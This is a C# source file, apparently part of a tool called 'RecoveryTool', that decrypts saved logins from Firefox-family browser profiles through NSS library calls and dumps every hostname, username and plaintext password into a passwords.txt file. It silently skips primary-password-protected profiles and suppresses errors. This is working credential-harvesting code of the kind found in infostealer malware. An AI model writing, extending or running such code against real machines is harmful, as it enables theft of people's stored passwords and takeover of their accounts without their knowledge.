using System.Text.Json;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoPasswords
    {
        private record LoginData
        {
            public int Id { get; init; }
            public string Hostname { get; init; }
            public string EncryptedUsername { get; init; }
            public string EncryptedPassword { get; init; }
            public long TimeCreated { get; init; }
            public long TimeLastUsed { get; init; }
            public int TimesUsed { get; init; }
        }

        private record JsonData
        {
            public List<LoginData> Logins { get; init; }
        }

        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "Passwords", ProcessProfileAsync, "passwords.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            try
            {
                int initResult = GeckoCommon.NSS_Init($"sql:{profilePath}");
                if (initResult != 0)
                {
                    return string.Empty;
                }

                IntPtr keySlot = GeckoCommon.PK11_GetInternalKeySlot();
                if (keySlot == IntPtr.Zero)
                {
                    return string.Empty;
                }

                int needLogin = GeckoCommon.PK11_NeedLogin(keySlot);
                if (needLogin != 0)
                {
                    GeckoCommon.PK11_FreeSlot(keySlot);
                    return string.Empty;
                }

                string loginsJsonPath = Path.Combine(profilePath, "logins.json");
                if (!File.Exists(loginsJsonPath))
                {
                    GeckoCommon.PK11_FreeSlot(keySlot);
                    return string.Empty;
                }

                string jsonContent = await File.ReadAllTextAsync(loginsJsonPath);
                if (string.IsNullOrWhiteSpace(jsonContent))
                {
                    GeckoCommon.PK11_FreeSlot(keySlot);
                    return string.Empty;
                }

                var jsonData = JsonSerializer.Deserialize<JsonData>(jsonContent, new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true
                });

                if (jsonData?.Logins == null || jsonData.Logins.Count == 0)
                {
                    GeckoCommon.PK11_FreeSlot(keySlot);
                    return string.Empty;
                }

                foreach (var login in jsonData.Logins)
                {
                    try
                    {
                        string user = await GeckoCommon.DecryptAsync(login.EncryptedUsername);
                        string pass = await GeckoCommon.DecryptAsync(login.EncryptedPassword);
                        sb.AppendLine($"ID: {login.Id}");
                        sb.AppendLine($"Hostname: {login.Hostname}");
                        sb.AppendLine($"Username: {user}");
                        sb.AppendLine($"Password: {pass}");
                        sb.AppendLine($"Time Last Used: {GeckoCommon.UnixTimeStampToDateTime(login.TimeLastUsed)}");
                        sb.AppendLine($"Time Created: {GeckoCommon.UnixTimeStampToDateTime(login.TimeCreated)}");
                        sb.AppendLine($"Times Used: {login.TimesUsed}");
                        sb.AppendLine();
                    } catch { }
                }

                GeckoCommon.PK11_FreeSlot(keySlot);
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
